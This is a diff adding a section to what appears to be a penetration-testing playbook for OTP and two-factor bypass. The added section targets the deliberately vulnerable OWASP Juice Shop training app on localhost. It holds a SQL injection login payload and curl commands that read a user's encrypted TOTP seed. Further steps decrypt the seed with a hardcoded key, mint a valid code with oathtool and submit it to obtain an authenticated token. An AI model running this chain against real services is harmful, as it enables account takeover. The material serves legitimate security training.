@@ -27,6 +27,34 @@ ffuf -u "https://target.com/api/verify-otp" \
 4. If accepted → OTP never invalidated = ATO (attacker sniffs OTP once, reuses forever)
 ```
 
+### Pattern 2b (P2): Recover Stored TOTP Seed → Compute Valid OTP (Juice Shop)
+> Distinct from brute (P1), replay (P2), and step-skip (P4): you never guess or
+> reuse a code — you steal the seed and mint your own. Juice Shop stores each
+> user's TOTP seed in the `Users` table column `totpSecret`, AES-encrypted with a
+> hardcoded key. Exfil it via SQLi on the auto-CRUD `Users` model, decrypt, then
+> derive the live 6-digit code with `oathtool`.
+```bash
+# 1) Exfil the encrypted totpSecret. The exposed Sequelize auto-CRUD REST endpoint
+#    /api/Users (and login SQLi) leaks the column. Juice Shop's login is SQLi-able:
+curl -s http://localhost:3000/rest/user/login \
+  -H "Content-Type: application/json" \
+  -d '{"email":"admin@juice-sh.op'"'"'--","password":"x"}'
+# Or pull the row directly once you have any read primitive (IDOR/SQLi UNION):
+curl -s "http://localhost:3000/api/Users/1" | python3 -c \
+  'import sys,json;print(json.load(sys.stdin)["data"].get("totpSecret"))'
+
+# 2) Decrypt totpSecret. Juice Shop uses AES (lib/insecurity.ts hardcoded key
+#    "this is my das ist mein ... key") → recover the base32 seed, e.g. "IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH".
+
+# 3) Mint a valid OTP from the recovered seed and submit it to the 2FA verify step:
+oathtool --totp -b "IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH"   # -> e.g. 481910
+curl -s http://localhost:3000/rest/2fa/verify \
+  -H "Content-Type: application/json" \
+  -d '{"tmpToken":"<tmpToken-from-login>","totpToken":"481910"}'
+# 200 + authentication JWT for a 2FA-enabled account = full bypass.
+```
+Unlocks: **Two Factor Authentication** (`wurstbrot@juice-sh.op` is the 2FA-enabled target).
+
 ### Pattern 3: Response Manipulation
 ```
 1. Enter wrong OTP → capture response in Burp
